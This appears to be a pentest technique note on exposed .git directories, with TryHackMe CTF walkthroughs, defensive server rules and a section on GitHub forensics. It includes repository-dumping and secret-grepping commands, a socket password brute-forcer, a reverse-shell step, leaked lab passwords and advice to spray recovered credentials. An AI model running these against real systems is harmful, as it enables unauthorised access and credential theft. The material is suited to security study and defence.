---
title: "Git Repository Exposure"
type: technique
tags: [enumeration, git-poc, information-disclosure, recon, thm, web]
phase: recon
date_created: 2026-05-08
date_updated: 2026-05-08
sources: [thm-web-git, git-raptor]
ate_updated: 2026-05-08
---

# Git Repository Exposure

## What it is

Exposed `.git/` directories and leaked git history allow attackers to reconstruct application source code, recover deleted secrets, find hardcoded credentials, and map internal application architecture — all without exploiting any vulnerability in the application itself.

## How it works

When a developer deploys code by copying or syncing a project directory to the web root, the `.git/` folder is sometimes included. Any visitor can then download raw git object files and reconstruct the full repository. Git history preserves every version of every file ever committed, including credentials, API keys, and internal paths that were later deleted.

---

## Methodology

### Step 1: Discover the exposed `.git/` directory

```bash
# Gobuster with common wordlists
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/big.txt | tee gobuster.initial

# Check directly
curl -s http://TARGET/.git/HEAD
# Expected response (exposed): "ref: refs/heads/main"
# 404 = not exposed
```

### Step 2: Dump the repository

**GitTools** (recommended — handles partial dumps):

```bash
git clone https://github.com/internetwache/GitTools.git
cd GitTools/Dumper

# Download all accessible git objects
./gitdumper.sh http://TARGET/.git/ /opt/output/dump/
```

**git-dumper** (Python alternative):

```bash
pip install git-dumper
git-dumper http://TARGET/.git/ /opt/output/dump/
```

After dumping, the output directory is a valid git repository that can be inspected with standard git commands.

### Step 3: Enumerate commit history

```bash
cd /opt/output/dump/

# List all commits with author, date, and message
git log

# Extract all commit hashes
git log | grep commit | cut -d " " -f2

# Show diff/content of every commit in sequence
git log | grep commit | cut -d " " -f2 | xargs git show

# Show a specific commit
git show <commit_hash>

# View all files at a specific commit
git show <commit_hash>:<filename>
```

### Step 4: Search for secrets in history

**Manual grep across all commits:**

```bash
# Search for password-like strings in all commit content
git log -p | grep -i -E "password|passwd|secret|api_key|apikey|token|credential"

# Search for specific file content that may have been deleted
git log --all --full-history -- "*.env"
git log --all --full-history -- "config.php"

# Show deleted file content from history
git show HEAD~1:config.php
```

**Automated secret scanning:**

```bash
# truffleHog — scans git history for high-entropy strings and regex patterns
pip install trufflehog
trufflehog git file:///opt/output/dump/

# gitleaks — fast regex-based secret detection
gitleaks detect --source /opt/output/dump/ --report-format json
```

### Step 5: Analyse source code

Once source code is recovered:

```bash
# Find hardcoded credentials in config files
grep -r "password\|passwd\|secret\|api_key" /opt/output/dump/ --include="*.php" --include="*.py" --include="*.js" --include="*.env"

# Find database connection strings
grep -r "mysql://\|mongodb://\|DB_PASS\|DATABASE_URL" /opt/output/dump/

# Find internal paths and API endpoints
grep -r "http://internal\|localhost\|127.0.0.1\|/admin\|/api" /opt/output/dump/

# Find private keys
find /opt/output/dump/ -name "*.pem" -o -name "id_rsa" -o -name "*.key"
```

---

## CTF Examples

### GitHappens CTF (THM)

A web server with an exposed `.git/` directory. Credentials for the admin panel were committed in a previous version.

```bash
# Dump the repo
./gitdumper.sh http://TARGET/.git/ /opt/dump/

# Review all commits
cd /opt/dump/
git log | grep commit | cut -d " " -f2 | xargs git show
# Found in a previous commit: Th1s_1s_4_L0ng_4nd_S3cur3_P4ssw0rd
```

### Pyrat CTF (THM)

A Python socket server running on port 8000 accepts raw Python code — effectively a Python REPL exposed over TCP. A `.git/` directory on the server contained an older version of the daemon (`pyrat.py.old`) that revealed hidden commands and the authentication mechanism.

**Initial access (Python code execution over socket):**

```bash
# Connect to the raw Python server
nc TARGET 8000
# Send Python reverse shell payload from revshells.com
```

**Privilege escalation via git history:**

```bash
# SSH as user 'think' after linpeas finds credentials
# credentials found: think / _TH1NKINGPirate$_

# Use git show to recover old daemon source
git show <commit_hash>  # reveals pyrat.py.old
```

The old source revealed an `admin` endpoint requiring a password. The password was brute-forced against the socket:

```python
# Command fuzzer — find valid endpoints
import socket, time

def send_command(command, host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.send(command.encode() + b'\n')
    time.sleep(0.1)
    response = s.recv(4096).decode()
    s.close()
    return response

for cmd in ['shell', 'admin', 'root', 'exec', 'cmd', 'sys']:
    print(cmd, send_command(cmd, 'TARGET', 8000))
```

```python
# Password brute force for the 'admin' endpoint
import socket, time

def try_password(password, host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.send(b"admin\n")
    time.sleep(0.1)
    resp = s.recv(4096).decode(errors='ignore')
    if "Password:" in resp:
        s.send(f"{password}\n".encode())
        time.sleep(0.1)
        resp += s.recv(4096).decode(errors='ignore')
    s.close()
    return resp

with open('/usr/share/wordlists/rockyou.txt', 'rb') as f:
    for line in f:
        pwd = line.decode('utf-8', errors='ignore').strip()
        r = try_password(pwd, 'TARGET', 8000)
        if "Password:" not in r:
            print(f"Found: {pwd}\n{r}")
            break
```

Once the admin password was found, the running Python process (root) accepted a reverse shell payload over the socket.

---

## Defence

- **`.gitignore`** — add secrets files (`.env`, `config.php`, `credentials.json`) to prevent accidental commit
- **Web server deny rules** — block access to `.git/` at the server level:
```nginx
location ~ /\.git { deny all; return 404; }
```
```apache
RedirectMatch 404 /\.git
```
- **Pre-commit hooks** — use `pre-commit` with `detect-secrets` or `gitleaks` to block commits containing secrets
- **Repository scanning in CI** — add `trufflehog` or `gitleaks` to CI pipeline to catch leaked secrets on push
- **Secret rotation** — if a secret was ever committed, rotate it; git history is permanent even after `git rm`
- **Deploy artefacts, not source** — use CI/CD to build and deploy artefacts; do not deploy raw source directories to web roots

---

## OSS Forensics

OSS forensics investigates public GitHub repositories for deleted content, suspicious activity, and hidden history — beyond what the standard git interface shows. Useful for supply chain research, incident response, and insider threat analysis.

### Evidence Sources

| Source | What it provides | Persistence |
|--------|-----------------|-------------|
| **GitHub Archive (BigQuery)** | Immutable public event log since 2011 | Never deleted |
| **GitHub API** | Commit data by SHA; PR history; compare endpoints | Survives force-push |
| **Wayback Machine** | CDX API snapshots of public URLs | Cached snapshots |
| **Local git** | Dangling commits (unreachable from any branch) | Until `git gc` |
| **Vendor reports** | IOCs: SHAs, usernames, timestamps, file paths | External |

### Evidence Confidence Model

| Confidence | Evidence |
|-----------|---------|
| **CONFIRMED** | GH Archive event + GitHub API commit + Wayback snapshot (all three) |
| **FIRM** | Any two of the three sources agree |
| **TENTATIVE** | Single source only |

### GitHub Archive (BigQuery)

GH Archive records all public GitHub events immutably. Query via BigQuery even for deleted repos.

```sql
-- Find all push events from a user to a repo
SELECT created_at, type, actor.login, repo.name,
       JSON_EXTRACT_SCALAR(payload, '$.ref') AS branch,
       JSON_EXTRACT_SCALAR(payload, '$.head') AS head_sha
FROM `githubarchive.day.20250713`
WHERE repo.name = 'aws/aws-toolkit-vscode'
  AND type = 'PushEvent'
ORDER BY created_at;

-- Find force-pushes (before != after, distinct commits)
SELECT created_at, actor.login,
       JSON_EXTRACT_SCALAR(payload, '$.before') AS before_sha,
       JSON_EXTRACT_SCALAR(payload, '$.head') AS after_sha
FROM `githubarchive.day.*`
WHERE repo.name = 'OWNER/REPO'
  AND type = 'PushEvent'
  AND JSON_EXTRACT_SCALAR(payload, '$.before') != '0000000000000000000000000000000000000000'
  AND JSON_EXTRACT_SCALAR(payload, '$.forced') = 'true'
  AND _TABLE_SUFFIX BETWEEN '20250101' AND '20250713';

-- Find deleted branches (DeleteEvent)
SELECT created_at, actor.login, JSON_EXTRACT_SCALAR(payload, '$.ref') AS branch
FROM `githubarchive.day.*`
WHERE repo.name = 'OWNER/REPO'
  AND type = 'DeleteEvent'
  AND _TABLE_SUFFIX BETWEEN '20250101' AND '20250713';
```

### Dangling Commit Recovery

Force-pushed or deleted commits remain as dangling objects until `git gc` runs.

```bash
# Clone the repo (even current state)
git clone https://github.com/OWNER/REPO.git && cd REPO

# Find unreachable commits
git fsck --unreachable | grep commit

# Inspect a specific SHA (from GH Archive or vendor report)
git show <sha>
git show <sha> --stat
git show <sha>:path/to/file.py    # specific file at that commit

# If SHA not in local clone (already GC'd), recover via GitHub API
curl -H "Authorization: token $GH_TOKEN" \
  "https://api.github.com/repos/OWNER/REPO/commits/<sha>"

# Or via raw URL (sometimes works post-deletion):
curl "https://github.com/OWNER/REPO/commit/<sha>.patch"
```

### Wayback Machine Recovery

The CDX API returns all archived snapshots for a URL, including deleted files.

```bash
# List all snapshots of a file
curl "http://web.archive.org/cdx/search/cdx?url=raw.githubusercontent.com/OWNER/REPO/main/file.py&output=json&limit=20"

# Fetch a specific snapshot (timestamp from CDX output)
curl "https://web.archive.org/web/20250713120000/https://raw.githubusercontent.com/OWNER/REPO/main/file.py"

# Enumerate all archived paths under a repo
curl "http://web.archive.org/cdx/search/cdx?url=raw.githubusercontent.com/OWNER/REPO/*&output=json&collapse=urlkey&limit=100"
```

### GitHub API Forensics

```bash
# Fetch commit by SHA (survives force-push if object not GC'd)
curl -H "Authorization: token $GH_TOKEN" \
  "https://api.github.com/repos/OWNER/REPO/commits/<sha>"

# Compare two commits / branches
curl -H "Authorization: token $GH_TOKEN" \
  "https://api.github.com/repos/OWNER/REPO/compare/before_sha...after_sha"

# Closed PRs (deleted branches still visible in PR history)
curl -H "Authorization: token $GH_TOKEN" \
  "https://api.github.com/repos/OWNER/REPO/pulls?state=closed&per_page=100"

# All events for a user
curl -H "Authorization: token $GH_TOKEN" \
  "https://api.github.com/users/USERNAME/events/public?per_page=100"
```

### IOC Extraction from Vendor Reports

When given a public incident report or advisory, extract:
- Commit SHAs (40-char hex strings)
- GitHub usernames (format: `@username` or `github.com/username`)
- Timestamps (ISO 8601 or human-readable)
- File paths that were modified
- IP addresses or infrastructure details

Then verify each IOC across sources before including in hypothesis.

### Investigation Phases

1. **Seed** — collect initial IOCs (SHA, username, date range, repo) from user prompt or vendor report
2. **Parallel evidence collection** (run simultaneously):
   - Query GH Archive (BigQuery) for events in date range
   - Query GitHub API for commits by SHA + PR history
   - Query Wayback Machine CDX for URL snapshots
   - `git fsck --unreachable` on cloned repo for dangling commits
3. **Hypothesis formation** — draft what happened; flag where evidence is TENTATIVE
4. **Evidence verification** — cross-reference each claim against original sources
5. **Hypothesis validation** — checker reviews claims against verified evidence; revise
6. **Final report** — timeline, attribution confidence, IOCs, unanswered questions

---

## Tools

- GitTools (`gitdumper.sh`) — https://github.com/internetwache/GitTools
- `git-dumper` — `pip install git-dumper`
- `trufflehog` — high-entropy and pattern-based secret detection in git history
- `gitleaks` — fast regex-based SAST for leaked secrets
- `git log`, `git show` — standard git inspection commands
- BigQuery + GH Archive — immutable public event log (requires Google Cloud project)
- Wayback Machine CDX API — `http://web.archive.org/cdx/search/cdx`

## Sources

- THM: GitHappens (`githappens`)
- THM: Pyrat (`pyrat`)

## `.git-credentials` / `.netrc` on the web root (cleartext creds, not the `.git/` dir)

Beyond `/.git/`, always probe a web root for git's OWN credential-store files, written when a repo
sets `credential.helper store`. They hold cleartext `https://user:pass@host` and are a one-GET
credential leak - no `.git/` reconstruction needed:

```
curl -s http://TARGET/.git-credentials     # one https://user:pass@host per line
curl -s http://TARGET/.netrc               # machine / login / password triples
```

The creds are URL-encoded in `.git-credentials` (`%40`=`@`, `%21`=`!`, `%23`=`#`); decode before
reuse, then spray them against SSH, the app login, and any host the URL names (the leaked host is
often a pivot, not the web box itself). Add both filenames to content-discovery wordlists - a plain
`ffuf` for `.git` misses them.

<!-- promoted-slug: git-credentials-web-exposure -->
